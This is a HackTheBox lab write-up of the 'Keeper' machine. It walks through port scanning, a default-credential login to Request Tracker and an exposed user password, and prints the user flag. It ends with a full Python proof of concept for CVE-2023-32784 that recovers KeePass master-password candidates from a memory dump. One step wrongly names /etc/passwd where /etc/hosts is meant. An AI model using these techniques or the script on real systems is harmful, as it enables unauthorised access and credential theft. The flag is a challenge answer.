# Keeper
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2ee9d4d2-b21e-4238-88c9-b487c0a65923)


## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.227 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 06:14 PDT
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.01 seconds
```

1. Based from the nmap results, we know that the machine runs a web application and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e8f6e209-5fbb-4a76-bcfc-58913a0aa156)


2. To open the subdomain --> tickets.keeper.htb, we need to add that hostname to /etc/passwd first.

> tickets.keeper.htb

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/faa6354d-d019-40a9-a75e-d99b94e4977c)


3. Noticing there's no register option, I searched on the internet for request tracker default cred.

> RESULT --> root:password

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cc541995-9be8-47f0-b8c6-1f7d49061711)


4. Let's use the cred --> successfully logged in as root!

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/252ba974-aff4-41df-b6c7-d8d0775146a1)



5. Long story short, we can see all the user by open the navbar admin --> users --> select.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/09756ecf-647d-46db-b8a2-8e74deb768da)


6. As we can see there's a user named lnorgaard.
7. Since the machine opens a ssh login, seems we need to login as lnorgaard.
8. Anyway, if you clicked the username and scrolls down to the comment section.
9. You shall find a password hardcoded there.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b08497c0-367c-4d97-a742-8f4d8fcf7e27)


10. Let's login.

> LOGIN AS lnorgaard

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f844ad58-c4a9-4869-b7ff-7b6f3147b8e1)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b82fefbf-d5de-4c7f-8391-d66cca9993f6)


## USER FLAG

```
4568e6ca6ced018b446f6ae5688ff786
```

11. After checked sudo permisisons for lnorgaard. It seems to get the root flag, we need to find another user cred, because we can't do privesc.


```
lnorgaard@keeper:~$ sudo -l
[sudo] password for lnorgaard: 
Sorry, user lnorgaard may not run sudo on keeper.
```

12. Unzipping the .zip file shall resulting to 2 files namely --> `KeePassDumpFull.dmp` and `passcodes.kdbx`.
13. Anyway analyze the .dmp file in WinDbg shall not resulting any useful information.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/457e4e21-ca3d-46e9-aaa6-14f3ef5282d4)


> FULL INFO

```
0:007> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


KEY_VALUES_STRING: 1

    Key  : Analysis.CPU.mSec
    Value: 10983

    Key  : Analysis.Elapsed.mSec
    Value: 10982

    Key  : Analysis.IO.Other.Mb
    Value: 89

    Key  : Analysis.IO.Read.Mb
    Value: 5

    Key  : Analysis.IO.Write.Mb
    Value: 184

    Key  : Analysis.Init.CPU.mSec
    Value: 25765

    Key  : Analysis.Init.Elapsed.mSec
    Value: 4800995

    Key  : Analysis.Memory.CommitPeak.Mb
    Value: 253

    Key  : CLR.BuiltBy
    Value: NET48REL1LAST_C

    Key  : CLR.Engine
    Value: CLR

    Key  : CLR.Version
    Value: 4.8.4420.0

    Key  : Failure.Bucket
    Value: BREAKPOINT_80000003_win32u.dll!NtUserWaitMessage

    Key  : Failure.Hash
    Value: {a106cd41-a8b1-c51d-6d94-a75661270841}

    Key  : Timeline.OS.Boot.DeltaSec
    Value: 244

    Key  : Timeline.Process.Start.DeltaSec
    Value: 75

    Key  : WER.OS.Branch
    Value: vb_release

    Key  : WER.OS.Version
    Value: 10.0.19041.1

    Key  : WER.Process.Version
    Value: 2.53.1.0


FILE_IN_CAB:  KeePassDumpFull.dmp

NTGLOBALFLAG:  0

PROCESS_BAM_CURRENT_THROTTLED: 0

PROCESS_BAM_PREVIOUS_THROTTLED: 0

APPLICATION_VERIFIER_FLAGS:  0

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 0000000000000000
   ExceptionCode: 80000003 (Break instruction exception)
  ExceptionFlags: 00000000
NumberParameters: 0

FAULTING_THREAD:  0000113c

PROCESS_NAME:  KeePass.exe

ERROR_CODE: (NTSTATUS) 0x80000003 - {EXCEPTION}  Breakpoint  A breakpoint has been reached.

EXCEPTION_CODE_STR:  80000003

STACK_TEXT:  
00000000`00cfea58 00007fff`db0c7a39     : 00000000`02bde7f8 00007fff`db058b3a 00000000`00000000 0000cb49`0caa2331 : win32u!NtUserWaitMessage+0x14
00000000`00cfea60 00007fff`db058895     : 00000000`02bde7f8 00000000`00cfeb70 00000000`00000004 00000000`ffffffff : System_Windows_Forms_ni+0x337a39
00000000`00cfeb10 00007fff`db057fc7     : 00000000`02dd2e58 00000000`00000001 00000000`00000000 00000000`00000000 : System_Windows_Forms_ni!System.Windows.Forms.Application.ComponentManager.System.Windows.Forms.UnsafeNativeMethods.IMsoComponentManager.FPushMessageLoop+0x575
00000000`00cfec00 00007fff`db057dc2     : 00000000`02bde7f8 00000000`ffffffff 00000000`02d52010 00007fff`db02454f : System_Windows_Forms_ni!System.Windows.Forms.Application.ThreadContext.RunMessageLoopInner+0x1c7
00000000`00cfeca0 00007fff`7eb819ef     : 00000000`02cdf5d8 00000000`00000000 00000000`00f41828 00000000`00ed7408 : System_Windows_Forms_ni!System.Windows.Forms.Application.ThreadContext.RunMessageLoop+0x52
00000000`00cfed00 00007fff`7eb705e3     : 00000000`02bb2c58 00007fff`7ea64148 00000000`00000000 00007fff`00000000 : KeePass!KeePass.Program.MainPriv+0xcef
00000000`00cfed90 00007fff`de0c6923     : 00000000`02bb2c58 00007fff`7ea64148 00000000`00000000 00007fff`00000000 : KeePass!KeePass.Program.Main+0x13
00000000`00cfedd0 00007fff`de0c6838     : 00000000`00000000 00007fff`de0c864e 00000000`00cff0b8 00000000`00000000 : clr!CallDescrWorkerInternal+0x83
00000000`00cfee10 00007fff`de0c70e8     : 00000000`00cff0b8 00000000`00cff148 00000000`00cfefb8 00000000`00000001 : clr!CallDescrWorkerWithHandler+0x4e
00000000`00cfee50 00007fff`de25b210     : 00000000`00cfef00 00000000`00000001 00000000`00000001 00000000`00ed3cf0 : clr!MethodDescCallSite::CallTargetWorker+0x102
00000000`00cfef50 00007fff`de25bab7     : 00000000`00000001 00000000`00000000 00000000`02bb2808 00000000`02bb2c58 : clr!RunMain+0x25f
00000000`00cff130 00007fff`de25b96b     : 00000000`00f1ae80 00000000`00cff520 00000000`00f1ae80 00000000`00f5da70 : clr!Assembly::ExecuteMainMethod+0xb7
00000000`00cff420 00007fff`de25b2b4     : 00000000`00000000 00000000`00610000 00000000`00000000 00000000`00000000 : clr!SystemDomain::ExecuteMainMethod+0x643
00000000`00cffa20 00007fff`de25b00d     : 00000000`00610000 00007fff`de25c1e0 00000000`00000000 00000000`00000000 : clr!ExecuteEXE+0x3f
00000000`00cffa90 00007fff`de25c1f4     : ffffffff`ffffffff 00007fff`de25c1e0 00000000`00000000 00000000`00000000 : clr!_CorExeMainInternal+0xb2
00000000`00cffb20 00007fff`f0558c01     : 00000000`00000000 00007ff8`00000091 00000000`00000001 00000000`00cffaf8 : clr!CorExeMain+0x14
00000000`00cffb60 00007fff`f060ac42     : 00000000`00000000 00007fff`de25c1e0 00000000`00000000 00000000`00000000 : mscoreei!CorExeMain+0x112
00000000`00cffbc0 00007ff8`09ad6fd4     : 00007fff`f0550000 00000000`00000000 00000000`00000000 00000000`00000000 : mscoree!CorExeMain_Exported+0x72
00000000`00cffbf0 00007ff8`0a19cec1     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0x14
00000000`00cffc20 00000000`00000000     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21


STACK_COMMAND:  ~0s; .ecxr ; kb

SYMBOL_NAME:  win32u!NtUserWaitMessage+14

MODULE_NAME: win32u

IMAGE_NAME:  win32u.dll

FAILURE_BUCKET_ID:  BREAKPOINT_80000003_win32u.dll!NtUserWaitMessage

OS_VERSION:  10.0.19041.1

BUILDLAB_STR:  vb_release

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

IMAGE_VERSION:  10.0.19041.264

FAILURE_ID_HASH:  {a106cd41-a8b1-c51d-6d94-a75661270841}

Followup:     MachineOwner
---------
```

14. Then i did a small outsource about keepas dump masterkey.
15. Turnsout there is a python script which we can use from this github --> `https://github.com/CMEPW/keepass-dump-masterkey`.

```py
import argparse
import logging
import itertools


class TaggedFormatter(logging.Formatter):

    TAGS = {
        'DEBUG': '\x1b[1;35m#\x1b[0m',
        'INFO': '\x1b[1;34m.\x1b[0m',
        'WARNING': '\x1b[1;33m-\x1b[0m',
        'ERROR': '\x1b[1;31m!\x1b[0m',
        'CRITICAL': '\x1b[1;31m!!\x1b[0m'
    }

    def __init__(self, format):
        logging.Formatter.__init__(self, format)

    def format(self, record):
        levelname = record.levelname

        if levelname in self.TAGS:
            record.levelname = self.TAGS[levelname]

        return logging.Formatter.format(self, record)


def setup_logging(debug = False):
    formatter = TaggedFormatter('%(asctime)s [%(levelname)s] [%(name)s] %(message)s')
    handler = logging.StreamHandler()
    root_logger = logging.getLogger()

    handler.setFormatter(formatter)
    root_logger.addHandler(handler)

    if debug:
        root_logger.setLevel(logging.DEBUG)
    else:
        root_logger.setLevel(logging.INFO)


def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2023-32784 proof-of-concept')

    parser.add_argument('dump', type=str, help='The path of the memory dump to analyze')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true', help='Enable debugging mode')

    return parser.parse_args()


def get_candidates(dump_file):
    data = dump_file.read()
    candidates = []
    str_len = 0
    i = 0

    while i < len(data)-1:
        if (data[i] == 0xCF) and (data[i + 1] == 0x25):
            str_len += 1
            i += 1
        elif str_len > 0:
            if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])

                if not candidate in candidates:
                    candidates.append(candidate)
            
            str_len = 0
        
        i += 1
    
    return candidates


if __name__ == '__main__':
    args = parse_args()
    setup_logging(args.debug)
    logger = logging.getLogger('main')

    with open(args.dump, 'rb') as dump_file:
        logger.info(f'Opened {dump_file.name}')

        candidates = get_candidates(dump_file)
        candidates = [x.decode('utf-16-le') for x in candidates]
        groups = [[] for i in range(max([len(i) for i in candidates]))]

        for candidate in candidates:
            groups[len(candidate) - 1].append(candidate[-1])
        
        for i in range(len(groups)):
            if len(groups[i]) == 0:
                groups[i].append(b'\xCF\x25'.decode('utf-16-le'))
        
        for password in itertools.product(*groups):
            password = ''.join(password)
            print(f'Possible password: {password}')
```


